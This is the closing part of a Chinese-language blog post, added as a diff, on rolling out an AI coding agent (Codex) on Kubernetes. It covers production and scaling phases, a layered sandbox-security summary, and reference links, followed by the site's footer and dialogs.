+<h3 id="Phase-3-生产（3-6-个月）"><a href="#Phase-3-生产（3-6-个月）" class="headerlink" title="Phase 3: 生产（3-6 个月）"></a>Phase 3: 生产（3-6 个月）</h3><p><strong>目标</strong>：全公司可用，过安全合规审查。</p>
+<ul>
+<li>CRD/Operator 化用户接口</li>
+<li>集成公司 SSO（OIDC / SAML）</li>
+<li>多团队 onboard，per-team namespace + 配额</li>
+<li>全链路 OTel 追踪</li>
+<li>shell escalation 改造成 Web 审批 workflow</li>
+<li>接安全部门的 SIEM 系统</li>
+<li>灾备 + 跨可用区</li>
+</ul>
+<p><strong>判断标准</strong>：300 用户、月度成本可控、安全部门签字。</p>
+<h3 id="Phase-4-规模化（6-个月-）"><a href="#Phase-4-规模化（6-个月-）" class="headerlink" title="Phase 4: 规模化（6 个月+）"></a>Phase 4: 规模化（6 个月+）</h3><p><strong>目标</strong>：成为公司基础设施的一部分。</p>
+<ul>
+<li>Policy as code 流水线（策略改动走 GitOps）</li>
+<li>跨集群、多 region</li>
+<li>自定义 LLM router（按任务路由到不同模型）</li>
+<li>接公司 FinOps 系统做成本归因</li>
+<li>把 Codex 内嵌到 CI/CD 流程（自动修测试、自动写 release note）</li>
+<li>文档 + 内训 + Champion 网络</li>
+</ul>
+<hr>
+<h2 id="总结：从单机到生产的关键认知"><a href="#总结：从单机到生产的关键认知" class="headerlink" title="总结：从单机到生产的关键认知"></a>总结：从单机到生产的关键认知</h2><p>回头看这一路的演进，几个判断很重要：</p>
+<p><strong>单机 sandbox 不是被替代了，而是被复用了</strong>。Codex 的 5 层防御没有一层在 K8s 上消失，只是有的搬到了 namespace 里、有的搬到了准入控制器里、有的搬到了运行时类里。理解 Codex 单机的设计哲学，是理解它在 K8s 上怎么落地的前提。</p>
+<p><strong>深度防御的代价是复杂度，但没有捷径</strong>。PSS + gVisor + seccomp + AppArmor + NetworkPolicy + Falco + OPA 看起来重，但少任何一层都给攻击者留口子。<strong>生产 AI agent 平台不存在”轻量级安全”这种东西</strong>。</p>
+<p><strong>多租户和配额比安全更难</strong>。你以为难的是 sandbox 强度，做下去会发现真正难的是「300 个工程师怎么共享一个集群、怎么算账、怎么不互相影响」。这些问题没有银弹，只有靠 namespace + ResourceQuota + RBAC + 自研 Operator 的组合拳一点点磨。</p>
+<p><strong>从 MVP 到生产是 6 个月起步</strong>。别相信”两周搞定”的承诺。Codex K8s 化的 80% 工作量在第三阶段（生产化）：CRD 设计、SSO 集成、完整审计链、多团队 onboard。这些没法跳过。</p>
+<hr>
+<p>下一篇我们换个视角，讲<strong>4 个真实的企业落地场景</strong>：</p>
+<ol>
+<li><strong>内部 Copilot 替代</strong> —— 接公司 LLM Gateway / GitLab / Jira / 知识库，给全公司提供一个数据合规的 AI 编码助手</li>
+<li><strong>CI/CD AI 修复机器人</strong> —— PR 触发 → AI 在 sandbox 里跑测试 → 自动 fix → 自动提 MR</li>
+<li><strong>数据科学 / 内部查询平台</strong> —— 同事写自然语言 → AI 转 SQL/Python → sandbox 跑 → 数据零外泄</li>
+<li><strong>多 Agent 并发</strong> —— PM agent / Dev agent / Test agent 协作，每个独立 sandbox，权限不同</li>
+</ol>
+<p>每个场景都会给完整的架构图和落地代码示例。点 <a href="../23.Codex%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%90%BD%E5%9C%B0-%E4%B8%8B-4%E4%B8%AA%E7%94%9F%E4%BA%A7%E5%9C%BA%E6%99%AF%E7%9A%84%E7%9C%9F%E5%AE%9E%E8%90%BD%E5%9C%B0/Codex%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%90%BD%E5%9C%B0-%E4%B8%8B-4%E4%B8%AA%E7%94%9F%E4%BA%A7%E5%9C%BA%E6%99%AF%E7%9A%84%E7%9C%9F%E5%AE%9E%E8%90%BD%E5%9C%B0.md">22 → 23</a> 继续。</p>
+<hr>
+<blockquote>
+<p>参考资料</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://kubernetes.io/docs/concepts/security/pod-security-standards/">Pod Security Standards</a> - K8s 官方 pod 安全基线</li>
+<li><a target="_blank" rel="noopener" href="https://gvisor.dev/docs/">gVisor Documentation</a> - Google 的用户态内核 sandbox</li>
+<li><a target="_blank" rel="noopener" href="https://katacontainers.io/">Kata Containers</a> - 微 VM 容器运行时</li>
+<li><a target="_blank" rel="noopener" href="https://open-policy-agent.github.io/gatekeeper/">OPA Gatekeeper</a> - K8s 准入控制器</li>
+<li><a target="_blank" rel="noopener" href="https://kyverno.io/">Kyverno</a> - K8s 原生策略引擎</li>
+<li><a target="_blank" rel="noopener" href="https://cilium.io/">Cilium</a> - eBPF-based CNI 和 Service Mesh</li>
+<li><a target="_blank" rel="noopener" href="https://falco.org/">Falco</a> - syscall-level runtime threat detection</li>
+<li><a target="_blank" rel="noopener" href="https://kubearmor.io/">KubeArmor</a> - LSM-based runtime security</li>
+<li><a target="_blank" rel="noopener" href="https://www.cisecurity.org/benchmark/kubernetes">CIS Kubernetes Benchmark</a> - K8s 安全基线</li>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-project-kubernetes-top-ten/">OWASP Kubernetes Top 10</a> - K8s 常见安全风险</li>
+</ul>
+</blockquote>
+</div>
+    <aside class="post-rail">
+      <span class="post-rail__line"></span>
+      <span>LESLIE / WRITING</span>
+    </aside>
+  </div>
+
+  <footer class="post-footer shell">
+    <div><h2>如果这篇文章帮到了你，<br>也许下一篇会更有意思。</h2></div>
+    <a class="button button--primary" href="/writing/">继续阅读 →</a>
+  </footer>
+</article>
+</main>
+    <footer class="site-footer">
+  <div class="footer-grid">
+    <div>
+      <p class="footer-kicker">Leslie Zhang</p>
+      <p class="footer-statement">流水不争先，<br>争的是滔滔不绝。</p>
+    </div>
+    <div class="footer-links">
+      <a href="https://github.com/leslieAIbin" target="_blank" rel="noreferrer">GitHub ↗</a>
+      <a href="https://www.instagram.com/leslieaibin/" target="_blank" rel="noreferrer">Instagram ↗</a>
+      <button type="button" data-wechat-open>微信 / WeChat</button>
+      <a href="mailto:aibinzhangleslie@gmail.com">Email ↗</a>
+      <a href="/atom.xml">RSS ↗</a>
+    </div>
+    <div class="footer-meta">
+      <span>© 2026 Leslie Zhang</span>
+      <span>Writing, research and working systems.</span>
+    </div>
+  </div>
+</footer>
+
+    <dialog class="ask-dialog" id="ask-leslie" aria-labelledby="ask-title">
+  <div class="ask-dialog__shell">
+    <div class="ask-dialog__topbar">
+      <div>
+        <h2 id="ask-title">Ask Leslie</h2>
+      </div>
+      <button class="icon-button" type="button" data-ask-close aria-label="关闭">×</button>
+    </div>
+    <p class="ask-dialog__intro">从本站公开文章中寻找答案。当前版本在浏览器本地检索，不上传问题，也不会编造不存在的经历。</p>
+    <form class="ask-form" data-ask-form>
+      <label class="sr-only" for="ask-query">输入问题</label>
+      <textarea id="ask-query" rows="2" placeholder="例如：Agent Runtime 应该怎么设计？" data-ask-input></textarea>
+      <button type="submit">检索知识库 <span aria-hidden="true">↗</span></button>
+    </form>
+    <div class="ask-suggestions" aria-label="推荐问题">
+      
+        <button type="button" data-ask-suggestion="Agent Runtime 应该怎么设计？">Agent Runtime 应该怎么设计？</button>
+      
+        <button type="button" data-ask-suggestion="如何让 AI 操控真实世界设备？">如何让 AI 操控真实世界设备？</button>
+      
+        <button type="button" data-ask-suggestion="Leslie 最近在研究什么？">Leslie 最近在研究什么？</button>
+      
+    </div>
+    <div class="ask-results" data-ask-results aria-live="polite">
+      <div class="ask-empty">
+        <p>输入一个问题，我会把你带到 Leslie 写过的相关内容。</p>
+      </div>
+    </div>
+  </div>
+</dialog>
+
+    <dialog class="wechat-dialog" id="wechat-leslie" aria-labelledby="wechat-title">
+  <div class="wechat-dialog__shell">
+    <header>
+      <div>
+        <p class="section-label">WeChat</p>
+        <h2 id="wechat-title">微信联系</h2>
+      </div>
+      <button class="icon-button" type="button" data-wechat-close aria-label="关闭微信二维码">×</button>
+    </header>
+    <img src="/images/contact/wechat-leslie.png" alt="Leslie Zhang 的微信二维码" loading="lazy">
+    <p>扫码添加 Leslie，建议备注你的名字与来意。</p>
+  </div>
+</dialog>
+
+    <script>window.ORBITAL_ROOT = '/';</script>
+    <script src="/js/orbital.js" defer></script>
+  </body>
+</html>
